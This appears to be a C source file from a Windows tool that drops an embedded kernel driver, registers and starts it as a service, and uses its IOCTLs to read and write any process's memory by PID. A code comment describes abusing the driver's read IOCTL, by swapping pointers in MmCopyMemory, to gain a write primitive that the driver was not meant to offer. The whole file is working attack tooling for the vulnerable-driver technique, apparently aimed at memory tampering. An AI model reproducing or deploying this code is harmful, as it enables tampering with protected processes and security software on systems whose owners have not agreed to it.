#include "drv.h"
#include "drvbytes.h"

BOOL dropDrv()
{
    HANDLE hFile;

    hFile = CreateFile(
        DRV_NAMEW,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("CreateFile failed: %d\n", GetLastError());
        return 0;
    }

    DWORD bytesWritten;
    BOOL writeResult = WriteFile(
        hFile,
        drvBytes,
        sizeof(drvBytes),
        &bytesWritten,
        NULL
    );

    if (!writeResult)
    {
        printf("WriteFile failed: %d\n", GetLastError());
        return 0;
    }

    CloseHandle(hFile);

    return bytesWritten;
}

LPCWSTR getDrvPath()
{
    WCHAR* path = (WCHAR*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));

    if (path == NULL)
    {
        printf("Failed to allocate memory.\n");
        return NULL;
    }

    DWORD length = GetModuleFileNameW(NULL, path, MAX_PATH);

    if (length == 0 || length == MAX_PATH)
    {
        printf("GetModuleFileName failed: %d\n", GetLastError());
        LocalFree(path);
        return NULL;
    }

    WCHAR* lastSlash = wcsrchr(path, L'\\');
    if (lastSlash == NULL)
    {
        LocalFree(path);
        return NULL;
    }

    size_t remainingSpace = MAX_PATH - (lastSlash - path) - 1;
    errno_t err = wcscpy_s(lastSlash + 1, remainingSpace, DRV_NAMEW);

    if (err != 0)
    {
        printf("wcscpy_s failed: %d\n", err);
        LocalFree(path);
        return NULL;
    }

    return path;
}

BOOL loadDrv()
{
    SC_HANDLE hSCManager;
    SC_HANDLE hService;

    hSCManager = OpenSCManager(
        NULL,
        NULL,
        SC_MANAGER_CREATE_SERVICE
    );

    if (hSCManager == NULL)
    {
        printf("OpenSCManager failed: %d\n", GetLastError());
        return 0;
    }

    LPCWSTR drvPath = getDrvPath();

    hService = CreateServiceW(
        hSCManager,
        DRV_NAMEW,
        DRV_NAMEW,
        SERVICE_START | DELETE | SERVICE_STOP,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        drvPath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );

    if (hService == NULL)
    {
        if (GetLastError() == ERROR_SERVICE_EXISTS)
        {
            printf("Service already exists...\n");

            hService = OpenService(
                hSCManager,
                DRV_NAMEW,
                SERVICE_START | DELETE | SERVICE_STOP
            );

            if (hService == NULL) {
                printf("OpenService failed: %d\n", GetLastError());
                CloseServiceHandle(hSCManager);
                return 0;
            }
        }
        else {
            printf("CreateService failed: %d\n", GetLastError());
            CloseServiceHandle(hSCManager);
            return 0;
        }
    }

    if (!StartServiceW(hService, 0, NULL))
    {
        printf("StartService failed: %d\n", GetLastError());
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return 0;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    return 1;
}

BOOL unloadDrv()
{
    SC_HANDLE hSCManager;
    SC_HANDLE hService;

    hSCManager = OpenSCManager(
        NULL,
        NULL,
        SC_MANAGER_CREATE_SERVICE
    );

    if (hSCManager == NULL)
    {
        printf("OpenSCManager failed: %d\n", GetLastError());
        return 0;
    }

    hService = OpenServiceW(
        hSCManager,
        DRV_NAMEW,
        SERVICE_STOP | DELETE
    );

    if (hService == NULL)
    {
        printf("OpenService failed: %d\n", GetLastError());
        CloseServiceHandle(hSCManager);
        return 0;
    }

    SERVICE_STATUS status;
    if (!ControlService(hService, SERVICE_CONTROL_STOP, &status))
    {
        printf("ControlService failed: %d\n", GetLastError());
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return 0;
    }

    if (!DeleteService(hService))
    {
        printf("DeleteService failed: %d\n", GetLastError());
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return 0;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    return 1;
}

BOOL drvReadMemory(HANDLE hDrv, DWORD pid, PVOID addr, void* buffer, DWORD size)
{
    READ_MEM request;
    request.pid = pid;
    request.addr = (void*)addr;
    request.buff = buffer;
    request.size = size;

    if (DeviceIoControl(
        hDrv,
        IOCTL_READ,
        &request,
        sizeof(request),
        &request,
        sizeof(request),
        NULL,
        NULL
    )) {
        return 1;
    }

    return 0;
}

BOOL drvWriteMemory(HANDLE hDrv, DWORD pid, PVOID addr, void* buffer, DWORD size)
{
    /*
        There is no write IOCTL but we can abuse MmCopyMemory function 
        in read IOCTL to write by swapping buffer and address pointers.
    */

    drvReadMemory(hDrv, pid, buffer, (void*)addr, size);
}

BOOL drvGetBaseAddr(HANDLE hDrv, DWORD pid, PVOID* addr)
{
    GET_BASE_ADDR request;
    request.pid = pid;

    if (DeviceIoControl(
        hDrv,
        IOCTL_BASE,
        &request,
        sizeof(request),
        &request,
        sizeof(request),
        NULL,
        NULL
    )) {
        *addr = request.addr;
        return 1;
    }

    return 0;
}

int initDrv()
{
    HANDLE hDrv;
    int bytesWritten = dropDrv();

    if (bytesWritten == 0)
        return DRV_STATUS_CANT_WRITE;

    printf("Dropped driver -> %ls (written %d bytes)\nLoading driver... ", getDrvPath(), bytesWritten);

    if (!loadDrv())
        return DRV_STATUS_LOAD_FAILED;

    printf("driver loaded\n");

    hDrv = CreateFileA(
        "\\\\.\\mstoresvc",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDrv == INVALID_HANDLE_VALUE)
    {
        printf("CreateFile failed: %d\n", GetLastError());
        return DRV_STATUS_CANT_PIPE;
    }

    return hDrv;
}